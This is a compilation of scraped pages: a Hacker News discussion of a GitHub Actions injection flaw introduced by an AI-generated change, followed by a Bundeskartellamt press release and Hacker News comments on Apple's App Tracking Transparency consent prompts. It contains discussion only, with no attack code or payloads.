+It can be that while also causing problems. It's like when a self driving car crashes, it's big news and everyone runs around like their pants are on fire. When a human driver crashes, it's a blip on local news or not even that.
+reply
+hennell
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+When a human driver controlling a bus crashes though it's a big story. Even bigger when it's a train. News scales with novelty and people impacted - 1 driver being a problem isn't an issue, an ai system used in many cars... That is more newsworthy.
+reply
+phatfish
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Probably because there are 1000x or whatever human driven miles compared to AI. And no one wants to be crippled by an AI have have to fight $billon_dollar_corp for compensation.
+reply
+pojzon
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Difference is in how you sell it.
+We all know that people make mistakes. I.e. crash a car from time to time.
+We all are sold a view that AI will save humanity, cure all diseases, solve all problems, allow for autonomous driving and many other (lies?).
+While making basic mistakes or crashing on trivial crossroads..
+Hype is way overblown.
+reply
+bonoboTP
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The anti-hype is also way overblown. Nobody is saying that today's AI is omniscient and never makes mistakes. Future models will make fewer mistakes. They will still not hook into the universe with a cheat code and do everything at 100 percent reliability. It's a straw man.
+reply
+Rebuff5007
+7 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+The hype has significant real-world consequences such as nonsensical amounts of funding and valuations that could crash the world economy at some point. Until there some "check" on this system, i think the anti-hype is quite valid.
+reply
+UpsideDownRide
+2 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Overblown? Not really. There is still not enough of criticism given asinine hype given by the LLM and adjacent companies.
+Funny of you to mention strawman after presenting one.
+reply
+skrtskrt
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+CI is shell scripts as a service. There is no safe way to use it.
+AI does it a lot faster and ignores rules even harder than humans do, but it's not the root problem here.
+reply
+inahga
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Sadly I'm not. Either way, how LLMs work mean that traditional software analysis tools are every bit as important as they were in the before times. This is why we see a lot of hype around LLMs and formal verification.
+reply
+airstrike
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The problem is that if everyone is 10x faster with LLMs then we're also wrong ~10x as frequently as we were before
+reply
+SV_BubbleTime
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I mean… it’s only Monday!
+But yes, there is an interesting change in the past decade, where everything new must be over-hyped.
+Perhaps it is attention overload and needing to shout. Perhaps it’s that technological progress has significantly slowed while communication options have exploded (coincidence?).
+I look at it a lot like EVs. They’re great, if your use case is inside the specific band. But, that isn’t who they were being marketed to. And now… “pushback” is putting it lightly.
+reply
+nomel
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> But yes, there is an interesting change in the past decade, where everything new must be over-hyped.
+Or, it's that the last two years have been the largest and fastest shift in the daily life of a programmer since the compiler, with near everyone moving, simultaneously, to this new tech, not because of hype, but because of practical personal benefit.
+Regardless, everything being hyped isn't new. There's always been silly hype in tech.
+reply
+madeofpalk
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Github Actions is actually so incredibly scary to have on public repo. It's full of so many footguns that's far from obvious.
+It's a shame Github is buried under their current server issues, because it would be great to get improvements all of this - at least warning/erroring on these sorts of things themselves.
+reply
+dataflow
+15 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Would it be fair to say the blame falls squarely on Github? Why do they even allow pasting of arbitrary strings from a title directly into a script? And if they feel there is a reason, what did they imagine the safe way to do it was?
+reply
+frollogaston
+3 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Honestly I wouldn't make this mistake. I wouldn't know how to fix that particular loc while still using bash for this, but I'd know it's dangerous.
+reply
+cryo32
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Proof that LLMs are trained on mediocre shit. That is by definition, mediocre shit.
+reply
+IncreasePosts
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Is that project named after the serial nyc subway advertising dermatologist?
+reply
+tingletech
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+yes, it says "Now you can have beautiful clean workflows!" and links to a youtube video of a TV ad for a dermatologist.
+reply
+woodruffw
+11 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Yes :-)
+reply
+mjr00
+17 hours ago
+|
+prev
+|
+next
+[–]
+It's interesting to look at what was being attempted when the vulnerability was introduced[0]
+> Workflows like jira_close.yml use deprecated atlassian JIRA actions and have a dependency on the gh-actions repo. This is not ideal and unecessarily complex. PR updates jira_close workflow to use direct API calls via curl. It preserves custom fields used too.
+I won't speak to this projects' management and how they prioritize things, but from my own experience, pre-AI, this type of change would have been firmly in the "this is a minor annoyance, put it in the Tech Debt Backlog alongside the 50000 other tickets" and never actually done. The cost of a human investing the time understanding how to fix the problem, doing code changes, testing them, and deploying them is just way too high for what actual value this change brings, which is close to nothing.
+Now with AI, it's as simple as firing up an agent and telling them to make a change; as much effort as writing that backlog Jira ticket in the first place.
+Similar to the problem open source is having with low-value PRs, companies are going to have to start realizing that code is
+not
+free to review or maintain, even when it's
+generated
+for ~free, in their internal processes. Just because an agent
+can
+fix a minor tech debt annoyance with a few lines of instructions doesn't mean it
+should
+.
+[0]
+https://github.com/snowflakedb/snowflake-connector-net/pull/...
+reply
+fg137
+16 hours ago
+|
+parent
+|
+next
+[–]
+I have seen plenty of "my backlog has never been shorter" comments here.
+I'm interested in how that turns out 6 months later.
+In my team, we have plenty of enhancement requests from users. We address those that make obvious sense and are trivial to do but withhold from others, even though the code change itself is likely small. Because we don't know if there is more than a single user that can actually benefit from it, if it has unintended consequences, or if it causes maintainence issue down the road.
+reply
+jacquesm
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> I'm interested in how that turns out 6 months later.
+That really is the real question, isn't it?
+For me it has been a mixed bag so far, I've seen some companies use this tech in a slow and deliberate manner to do what they were already doing but a little bit faster. I've also seen hail Mary passes where the whole codebase was turned over to agents to go wild on with an undersized team and little to no QA. Time will tell...
+reply
+ctoth
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> but withhold from others, even though the code change itself is likely small.
+Prediction: programming is going to change massively not only because the cost of creating code will go down, but because people are so tired of this sort of gatekeeping "we know better" from programmers.
+reply
+eterm
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+What you're describing as "gatekeeping" is actually Product Ownership and should be applauded, because the alternative is a product owner who abdicates responsibility to the customer.
+reply
+ctoth
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Lots of responses to a comment I explicitly did not make. Let me try and spell it out for you folks:
+demand was suppressed by an access bottleneck, the bottleneck is gone, expect a magnitude of change proportional to how much demand was actually pent up rather than proportional to how much programmers currently think was reasonable to deny.
+Explicit things I am not saying: gatekeeping was bad, feature creep is good or desirable, etc. etc. etc.
+reply
+philipallstar
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+This really makes it sound as though the programmers were doing something wrong:
+> people are so tired of this sort of gatekeeping "we know better" from programmers
+reply
+ljm
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+This describes a product with no vision or purpose.
+People have to take 'no' for an answer sometimes, even if they don't accept it. You can't really 'gatekeep' your own product.
+reply
+grey-area
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Knock yourself out and change the world, absolutely nobody is stopping you. That you haven’t already does tell us something though.
+reply
+ethin
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Can you explain to all of us how this gatekeeping is actually bad? Software would be way, way worse if we just allowed any arbitrary feature to be added to software, and ordinary people who want all the things would have to learn, the hard way, that doing all the things is not actually good.
+reply
+subtlejellyfish
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Thank you.  I'm spending a lot of time reminding my peers that cheerlead this sort of thing that feedback is usually presented to us a solution, not the underlying problem and that our job is to solve problems, not just vomit out the requested solution.
+reply
+datadrivenangel
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+And the software without gatekeepers will be regarded as confusing and complicated or buggy.
+The work to go from software to usable software system is vast.
+reply
+mjr00
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> Prediction: programming is going to change massively not only because the cost of creating code will go down, but because people are so tired of this sort of gatekeeping "we know better" from programmers.
+I assume the "gatekeeping" decision to not implement a feature request is coming from someone responsible for the product, not from a developer.
+reply
+procone
+17 hours ago
+|
+prev
+|
+next
+[–]
+YAML is a nightmare fuel spec.
+In its quest to make markup "human readable", it has created countless footguns.
+I honestly prefer XML at this point.
+reply
+doix
+15 hours ago
+|
+parent
+|
+next
+[–]
+Yeah, the YAMLification of everything kinda killed my ability to understand "everything". Previously, if you knew the Linux userland well, I felt like you could figure anything out with enough digging.
+Take CI for example, it was Jenkins and it ran a csh/bash/zsh whatever script and captured the output. Nice and simple (even if the scripts sometimes got insane).
+GitHub actions is nothing like that. Weird home grown extensions to YAML with their own idiosyncrasies and dynamically pulling in plugins from god knows where. You can't just take a workflow and execute it locally like you could with a bash script.
+reply
+jeroenhd
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The things done in yaml today would've been obscure bash oneliners had YAML not existed.
+Jenkins still exists and it's no less complicated than Github Actions. The complexity gets hidden in obscure script files, obscure tabbed UI, and remote services for doing things Jenkins itself can't do. Defaulting to system tooling makes it almost impossible to predict what a job will do unless you know exactly how paths and tooling are set up (and what versions they're running).
+None of my personal experiences with Jenkins had scripts that ran locally, they all relied on pre-installed software on the server because that was the thing people would do before the great YAMLification. You could copy-paste the Jenkins job, but unless you have Jabberwocky v2018.3 installed in /home/JabberWock/RELEASE, the script will fail.
+The entire software development flow has been made incredibly complex by hooking up automations into every nook and cranny.
+All of these complications need to be enabled manually, though. If your flow is complicated, you can cut it down to manageable size by doing a few more processes manually.
+Luckily, all of the simplication and reproduction steps for Github also apply to Jenkins. Github YAML files are just scripts with different syntax, after all. Just like you can run bash locally, you can run act and reproduce whatever Github trigger you need. From there, you can simplify pipelines, stop curl2bashing "plugins", and so on.
+reply
+itintheory
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+>  You could copy-paste the Jenkins job, but unless you have Jabberwocky v2018.3 installed in /home/JabberWock/RELEASE, the script will fail.
+In my experience, containerization resolved this issue.  Now you just need to be able to "docker run public.ecr.aws/carroll/jabberwocky:v2018.3 [etc]".
+reply
+jeroenhd
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+And in Github that would be something like:
+steps:
+- name: Run jabberwocky
+run: docker run -it public.ecr.aws/carroll/jabberwocky:v2018.3 [etc]
+reply
+doix
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+You are not wrong, Jenkins had many problems. But I would argue that the solutions were always grounded in the Linux userland.
+And I also agree that you could use GitHub actions in a similar way to how I talk about Jenkins. I also think you could use Jenkins in a way that is similar to GitHub actions with an extremely convoluted Jenkins file that relies on Jenkins plugins etc.
+But nowhere I worked did that with Jenkins, whereas everywhere I worked with GitHub actions does create extremely complex pipelines relying on 3rd party actions (with many being vendor supplied). I'm sure(hope?) the DevOps folks looked at what each action actually does by going to wherever it's pulled from and  read it (and the actions it pulls in).
+I'm not necessarily arguing that things are worse now. Just that you don't get a "free" understanding anymore by just having a good familiarity of the Linux userland. When there's a problem, I stick my head in the sand and let the DevOps people handle it.
+I also haven't worked anywhere that uses Jenkins in 10+ years, so maybe if I went back, it would be the same as Github.
+reply
+ljm
+13 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Except that YAML in almost every devops or CI workflow is YAML
+plus
+obscure bash oneliners.
+Or it's an obscure bash oneliner hidden in another repository as a package that you can depend on, which is either wrapped by another YAML config or maybe some JS.
+I don't think the criticisms of Jenkins compare because Jenkins is really much more than a CI layer, predates the concept of devops and our modern understanding of CI/CD, and it has a lot of complexity to make that work. That was back when you'd have IT teams provisioning your servers for you and shit.
+reply
+jeroenhd
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> in almost every devops or CI workflow
+But that's the core of the problem, isn't it? People setting up devops environments are the reason these flows are so complicated. You can set up the same flows by having Jenkins call out to Jenkins to trigger chains of jobs that can conditionally fail.
+People generally don't do it, because there are better alternatives out there for when you want those types of pipelines (which includes Github Actions and their counterparts). Setting up a four-step build+test+scan+tag+push+deploy pipeline in Jenkins is just as hard as it is with Github, if not harder. [Jenkinsfile](
+https://www.jenkins.io/doc/book/pipeline/jenkinsfile/
+) is just YAML with extra parentheses.
+The modern YAML files are a simplification of the manual steps required to do it all in tools that predated the YAML files. There's nothing stopping you from having a Github runner configuration that's just a call to a single Docker image containing all the bash/perl/Makefile/Kotlinscript/Go/Ruby/etc. files you want to execute. Or you can forego the Docker part and run code directly inside of the repository, with all the security risks that come with it (not dissimilar to having a fully open Jenkins server).
+Complicated YAML is a symptom. It's no better or worse than Bash or TOML or Makefile when you start adding conditional automation and multi-step CI/CD flows.
+reply
+muvlon
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+And worse: GitHub Actions not a full-fledged programming environment by itself either, so you're inevitably going to have to deal with nontrivial shell scripts on top of all the YAML mess.
+reply
+fragmede
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Yeah. It makes sense when you're standing right next to it, but you take a step back and go "that doesn't look right". GitHub actions is the faster horse instead of a car.
+reply
+anonymars
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+In a similar vein, JSON's lack of comments makes me marvel at how consistently JavaScript seems to choose the worse option.  I'm oh so glad it found its way into config files
+reply
+tuveson
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+As a data/serialization format (the original intended use of JSON), I think no comments is the right choice, since adding comments introduces a bunch of questions about how comments ought to be parsed into a datastructure (or if they should be sent/(de)serialized at all). But for config files the lack of comments is the wrong choice, since typically you want to explain why things are set the way they are. The lack of ordering of entries also makes total sense for data/(de)serialization, but makes no sense for a config. I think the problem is people are lazy and just want to JSON.parse() everything, and used JSON in places it doesn't belong, like config files.
+reply
+frollogaston
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Many JS toolchains will take js files as config to alleviate this problem. Which is actually nice if you ever need dynamic configs, cause that means not using some forsaken DSL. It still evaluates to JSON in the end.
+reply
+an0malous
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Seems more like the opposite vein, JSON's lack of comments or other affordances has kept it safe from footguns
+reply
+madeofpalk
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Of all the problems with YAML, how is comments a footgun?
+reply
+frollogaston
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The idea is it makes people think they can use YAML for sketchy stuff as long as they comment on it.
+reply
+an0malous
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> or other affordances
+reply
+anonymars
+5 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Well, while we're on the topic:
+"On the virtues of the trailing comma"
+https://devblogs.microsoft.com/oldnewthing/20240209-00/?p=10...
+reply
+xgulfie
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I've seen people put "//" keys in their json lol
+reply
+reddalo
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I've also seen using "__" as a key for comments. I think it's better because it doesn't need to be escaped.
+reply
+hutattedonmyarm
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+There _is_ a json variant with comments, so that’s what you’ve seen. Not all parsers support that though
+reply
+jeroenhd
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+It's non-standard JSON, so you can probably just assume most patsers don't support any given commented parser.
+At least XML permitted comments, fhe shift to JSON on everything almost makes me nostalgic.
+reply
+DenisM
+8 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+When you get too nostalgic just think back to XSD type system in Xquery. That should cure the nostalgia real fast.
+reply
+xgulfie
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Are you denying what I've seen with my own eyes? I am saying it was an object like this:
+{
+"//":"make sure these are divisible by 8",
+"width": 640,
+"height": 480
+}
+reply
+wincy
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Not the person you’re replying to but you were clear in what you were describing.
+It seems like they were thinking of some json parsers that’ll ignore just straight up anything after // before a new line in JSON (looking at you visual studio). So a .NET dev who has never touched anything but Visual Studio may make comments in the appsettings.json for a .NET project and it made all my command line parsers throw errors. Thanks Microsoft.
+reply
+stronglikedan
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+It's not terrible as far as I know, and it's less ambiguous than putting a "comment" key. I like it!
+reply
+fmbb
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+It’s find for actions and workflows as long as you do no interpolation and logic.
+Better move as much of that as possible into your own scripts. And your scripts can be portable between forges, and even run locally!
+reply
+RHSeeger
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The YAML spec/parse _itself_ does interpolation and logic - incorrectly in some cases. YAML is pretty much never the right solution.
+reply
+NewJazz
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Assigning an env var to an empty variable (env: { myvar: ${{unsetfoo}} }) should trigger an error, not silently pass an empty string.
+reply
+ezfe
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+What does that have to do with YAML?
+reply
+NewJazz
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+It has to do with the gha bastardization of yaml, which clearly learned nothing from ansible's deficiencies.
+reply
+formerly_proven
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> It’s find for actions and workflows as long as you do no interpolation and logic.
+How do you specify actions and workflows without interpolation and logic kind sir?
+reply
+NewJazz
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Run the same script for all of the workflow triggers and pass relevant vars into the script as environment variables.
+reply
+hbn
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+I never figured out how the hell to write YAML and I definitely won't now that I trust the AI to do a better job than me. It's so unintuitive.
+Every time I've tried in the past, something as simple as making a value a list had some nonsense expectations. I can't wrap my head around how that spec got any traction and wasn't laughed off the face of the earth the first time it was looked at by someone who didn't create it.
+reply
+frollogaston
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I don't get it either. There was a point where I had to write YAML, but it wasn't intuitive to begin with, and months in I was still accidentally setting the wrong number of indents or some nonsense.
+reply
+voakbasda
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+When I
+
+=== apple-att https://www.bundeskartellamt.de/SharedDocs/Meldung/EN/Pressemitteilungen/2026/08_17_2026_Apple_ATTF.html ===
+Bundeskartellamt  -  Homepage - Apple changes its rules for personalised advertising in apps
+Go to:
+Content
+Main Menu
+Search
+Deutsch
+Contact form
+FAQ
+Press
+Bundeskartellamt
+Bundeskartellamt
+About us
+President & Vice President
+Tasks & organisational structure
+International work
+Events
+Tasks
+Tasks
+Cartels
+Leniency programme
+Tip-offs
+Cartel prosecution
+Cartel fine proceedings
+Damages
+Merger control
+Obligation to notify a merger and key aspects of merger control
+Merger control proceedings
+Current merger control proceedings
+Second phase proceedings
+Control of abusive practices
+Public procurement law
+Competition Register
+Consumer protection
+Protecting competition means protecting consumers
+Protecting consumer rights
+Market Transparency Unit for Fuels
+Monitoring the energie markets
+Control of abusive practices in the context of energy price relief measures
+Sector inquiries
+Consumer protection
+Consumer protection
+Protecting competition means protecting consumers
+Protecting consumer rights
+Digital economy
+Digital economy
+Focussing on the digital economy
+Digital markets
+Proceedings against large digital companies
+Rules for the digital economy
+Protecting consumer rights
+Information & services
+Information & services
+Media library
+Case database
+Press releases & news
+Contact
+Contact form
+Postal and visitor address
+Telephone hotline
+Tip-offs
+Press
+Visitor groups
+Library
+Electronic communication
+Account details
+Legislation & further documents
+Bundeskartellamt
+Public procurement law
+Cartel prosecution
+Control of abusive practices
+Merger control
+Electronic invoicing
+Company surveys
+Label: Quick search
+Search item
+Main Menu
+Bundeskartellamt
+Back
+Main Menu
+Bundeskartellamt
+About us
+President & Vice President
+Tasks & organisational structure
+International work
+Events
+Tasks
+Back
+Main Menu
+Tasks
+Cartels
+Back
+Main Menu
+Tasks
+Cartels
+Tip-offs
+Leniency programme
+Tip-offs
+Cartel prosecution
+Cartel fine proceedings
+Damages
+Merger control
+Back
+Main Menu
+Tasks
+Merger control
+Obligation to notify a merger and key aspects of merger control
+Merger control proceedings
+Current merger control proceedings
+Second phase proceedings
+Control of abusive practices
+Public procurement law
+Competition Register
+Consumer protection
+Back
+Main Menu
+Consumer protection
+Protecting competition means protecting consumers
+Protecting consumer rights
+Market Transparency Unit for Fuels
+Monitoring the energie markets
+Control of abusive practices in the context of energy price relief measures
+Sector inquiries
+Consumer protection
+Back
+Main Menu
+Consumer protection
+Protecting competition means protecting consumers
+Protecting consumer rights
+Digital economy
+Back
+Main Menu
+Digital economy
+Focussing on the digital economy
+Digital markets
+Proceedings against large digital companies
+Rules for the digital economy
+Protecting consumer rights
+Information & services
+Back
+Main Menu
+Information &amp; services
+Media library
+Case database
+Press releases & news
+Contact
+Back
+Main Menu
+Contact form
+Postal and visitor address
+Telephone hotline
+Back
+Main Menu
+Information &amp; services
+Contact
+Back
+Main Menu
+Contact form
+Postal and visitor address
+Telephone hotline
+Back
+Main Menu
+Information &amp; services
+Contact
+Back
+Main Menu
+Contact form
+Postal and visitor address
+Telephone hotline
+Back
+Main Menu
+Information &amp; services
+Contact
+Back
+Main Menu
+Contact form
+Postal and visitor address
+Telephone hotline
+Back
+Main Menu
+Information &amp; services
+Contact
+Tip-offs
+Press
+Visitor groups
+Library
+Electronic communication
+Account details
+Tip-offs
+Press
+Visitor groups
+Library
+Electronic communication
+Account details
+Tip-offs
+Press
+Visitor groups
+Library
+Electronic communication
+Account details
+Tip-offs
+Press
+Visitor groups
+Library
+Electronic communication
+Account details
+Legislation & further documents
+Back
+Main Menu
+Information &amp; services
+Legislation &amp; further documents
+Bundeskartellamt
+Public procurement law
+Cartel prosecution
+Control of abusive practices
+Merger control
+Electronic invoicing
+Company surveys
+Contact form
+E-Mail:
+Report Barrier
+FAQ
+Press
+You are here:
+Homepage
+Apple changes its rules for personalised advertising in apps
+Apple changes its rules for personalised advertising in apps
+press releases
+17.08.2026
+published on:
+17.08.2026
+Apple will change its rules on how app providers can use user data on iPhones and iPads for personalised advertising. The Bundeskartellamt objected to the way in which Apple had designed different consent requests for Apple’s own offerings and third-party apps. Apple considers its rules (set out in its so-called “Apple Tracking Transparency Framework”, ATTF) to be compliant with competition law; nevertheless, the company offered commitments which the Bundeskartellamt has now declared binding. The proceeding has thus been concluded.
+Apple’s ATTF introduced rules for third-party app providers on the use of data on iPhones and iPads. For specific forms of cross-company data use, third-party app providers must obtain not only user consent under data protection law, but also additional consent through a prompt that is predefined by Apple. However, these ATTF rules do not apply to Apple’s own offerings; Apple uses user data from its own ecosystem and therefore its own prompt to request user consent to personalised advertising.
+Andreas Mundt, President of the Bundeskartellamt:
+“
+It is key that personal data and privacy are protected effectively when using apps. Apple is allowed to provide for a level of protection for its users that exceeds the minimum legal requirements. However, if Apple sets up additional rules within its ecosystem for the use of data, these rules must, under Germany’s special abuse provision for large digital companies, not treat its own offerings better than those of its competitors. This is precisely where our competition concerns arose. Apple will now align the consent requests much more closely and give third-party app providers more freedom to combine the necessary requests in a sensible way
+.”
+Many third-party apps are, at least partly, funded through advertising. Personalised advertising can generate higher revenues for app publishers. Other apps are funded through user payments, for example for the purchase of the app or subscriptions. In these cases Apple often receives a commission, whereas Apple generally does not receive a share of the app publishers’ advertising revenue. As a general rule, personal data may in any event only be used for advertising purposes if users give their consent in accordance with the requirements of German and European data protection law.
+Apple argued in the proceeding that the ATTF is meant to protect user privacy and that it is a competition law-compliant measure that also helps Apple position itself as providing a particularly high level of data protection. By contrast, the associations admitted to the proceeding, representing the branded-goods, media and advertising industries, took the view that, being a powerful gatekeeper, Apple was not allowed to set up additional, “extra-statutory” rules in the first place if these rules restrict other companies in their business activities.
+In the Bundeskartellamt’s preliminary assessment, competition law generally also allows powerful companies such as Apple to take measures to protect their users’ privacy. However, the differences between the consent request used for Apple’s own offerings and the consent request predefined by Apple for third-party apps exceeded what could be justified based on differences in types of data processing. The wording, design and selection options of the request used for Apple’s own offerings had the potential to encourage users to give their consent, whereas they had the potential to discourage consent for third-party apps. In addition, third-party apps in some cases had to request consent several times even when users had already given data protection law-compliant consent.
+With its operating systems and its App Store, Apple controls a key infrastructure for the distribution of apps on its devices. In addition, Apple offers its own apps and advertising space. This dual role makes Apple subject to specific competition law requirements. In the Bundeskartellamt’s preliminary assessment, there was a risk that, by setting out different rules, Apple was favouring its own offerings and impeding third-party app publishers.
+Apple will modify consent prompt and simplify consent requests
+Under the commitments that have now been declared binding, Apple will align the consent prompts for its own offerings and for third-party apps much more closely. This involves removing possibly discouraging symbols and wording in Apple’s predefined requests for third-party providers. The design of the consent prompts will be neutral in terms of content, wording and layout. In addition, app publishers and content providers, such as media publishers, will be given more scope to explain to users what significance personalised advertising has for their offering and their business model.
+Under the commitments, Apple will also reduce the complexity of the current consent request architecture for third-party providers. In particular, app publishers will be given more freedom to combine the consent request required by Apple with the consent requests required under data protection law or connect them in a way that is clear to users. The improved conditions may also benefit advertisers and technical service providers to the advertising industry.
+Andreas Mundt:
+“
+It is expressly not our aim to help achieve the highest possible levels of consent to personalised advertising. We want to ensure that users can make a free and informed decision. Users who do not wish to allow their data to be used for personalised advertising must be able to make an equally free and informed decision as users who intend to consent to such data use. The new consent requests are aimed at better enabling users to make this decision.
+”
+The Bundeskartellamt’s proceeding only examined whether Apple was in violation of German or European competition law. It did not aim at enforcing data protection law. To avoid possible delineation issues with data protection law, the Bundeskartellamt exchanged views with the Federal Commissioner for Data Protection and Freedom of Information (BfDI) and the Bavarian State Office for Data Protection Supervision (BayLDA).
+Cooperation with other European competition authorities
+Competition authorities of other EU Member States have also conducted proceedings concerning ATTF, some of which have already been concluded. To ensure that European competition law is applied consistently, the Bundeskartellamt maintained close and constructive dialogue with the relevant European authorities and the European Commission within the European Competition Network (ECN) throughout the proceeding.
+In two proceedings by other European competition authorities concerning ATTF, the authorities have already imposed substantial fines on Apple. Last year, the French and the Italian competition authorities imposed fines on Apple totalling 150 million and 98.6 million euros, respectively. The Bundeskartellamt’s proceeding aims at achieving that the future design of the ATTF complies with competition law. The solution now achieved in Germany forms part of this European dialogue and may also affect the future design of the ATTF in other EU Member States.
+Special abuse control of large digital companies
+The Bundeskartellamt’s proceeding was based on, in particular, Section 19a of the German Competition Act (GWB) and the prohibition of abuse of a dominant position under Article 102 TFEU. Section 19a GWB gives the Bundeskartellamt special powers of abuse control of large digital companies that are found to be of paramount significance for competition across markets. In a first step, the Bundeskartellamt issues a decision declaring that a company has this special competitive position. In a second step, the authority may prohibit the company from engaging in certain anti-competitive conduct.
+The Bundeskartellamt issued a decision finding that Apple is of paramount significance for competition across markets in April 2023. The Federal Court of Justice
+confirmed this decision in March 2025
+.
+Course of the proceeding
+The Bundeskartellamt initiated the proceeding against Apple in June 2022. In February 2025 the authority informed Apple and the associations admitted to the proceeding of its preliminary legal assessment (see
+press release of 13 February 2025
+). Later in the proceeding, Apple offered commitments, which the Bundeskartellamt assessed in a market test in December 2025 (see
+press release of 2 December 2025
+). After further amendments to the commitments, the Bundeskartellamt has now declared them binding and concluded the proceeding.
+Apple has four months from service of the decision to implement the changes proposed in the commitments and, before implementation, will test them together with app publishers. The commitments apply for seven years and will be monitored by an independent monitoring trustee.
+Further details on the proceeding, the changes to the ATTF and their effects can be found
+in the accompanying FAQ document
+.
+FAQ document
+FAQs
+Other
+17.08.2026
+Learn more
+Print page
+to the top
+X (Twitter)
+Icon_linkedIn
+LinkedIn
+Youtube
+Sitemap
+E-Mail:
+Report Barrier
+Privacy policy
+Legal notice
+© 2026 Bundeskartellamt
+
+=== hn-apple https://news.ycombinator.com/item?id=49331222 ===
+Apple's App Tracking Transparency treated its own apps better than rivals | Hacker News
+Hacker News
+new
+|
+past
+|
+comments
+|
+ask
+|
+show
+|
+jobs
+|
+submit
+login
+Apple's App Tracking Transparency treated its own apps better than rivals
+(
+bundeskartellamt.de
+)
+246 points
+by
+nyku
+18 hours ago
+|
+hide
+|
+past
+|
+favorite
+|
+93 comments
+help
+jshier
+17 hours ago
+|
+next
+[–]
+Title doesn't match the article, which is currently "Apple changes its rules for personalised advertising in apps".
+Apple gave itself better dialogs for the permission prompts, which they will now equalize (perhaps just in the EU?) with the prompts they use for their own apps.
+My understanding of ATTF is that first-party tracking needed no disclosure other than the information declared in the app's App Store privacy section about the information gathered. If you made a suite of 20 apps, you could track usage across all of them without issue, as long as you didn't also share that info with a third party.
+reply
+Despegar
+16 hours ago
+|
+parent
+|
+next
+[–]
+Apple didn't give itself better dialogs. It never did third-party tracking across across apps or websites so the ATT prompt would never apply to their apps. It also voluntarily showed a dialog explicitly asking you to opt into personalized advertising. Facebook doesn't show anything similar when you use Instagram or the Facebook app, because that would be undoubtedly bad for business.
+The German regulator settled because the facts are simply on Apple's side. Apple settled because at the end of the day it's no skin off their back if the EU now wants to weaken privacy protections to benefit ad-tech.
+EDIT: You can downvote me all you like, but it's right there on page 1 of the FAQ from the regulator.
+https://www.bundeskartellamt.de/SharedDocs/Publikation/EN/Pr...
+reply
+schubidubiduba
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Instagram does, in fact, have such a dialog in the EU. Because they are legally required to, like everybody else.
+reply
+Despegar
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
